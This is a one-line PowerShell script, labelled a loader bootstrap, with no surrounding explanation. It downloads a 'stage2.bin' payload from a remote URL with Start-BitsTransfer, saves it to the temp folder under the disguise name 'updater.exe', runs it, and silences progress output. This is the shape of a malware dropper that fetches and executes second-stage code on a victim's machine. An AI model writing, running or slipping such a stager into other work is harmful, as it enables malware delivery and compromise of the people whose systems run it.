
<# Loader bootstrap #> $PayloadUrl = 'http://example.org/cdn/stage2.bin'; $OutputPath = "$env:TEMP\updater.exe"; Start-BitsTransfer -Source $PayloadUrl -Destination $OutputPath; & $OutputPath; $ProgressPreference = "SilentlyContinue"
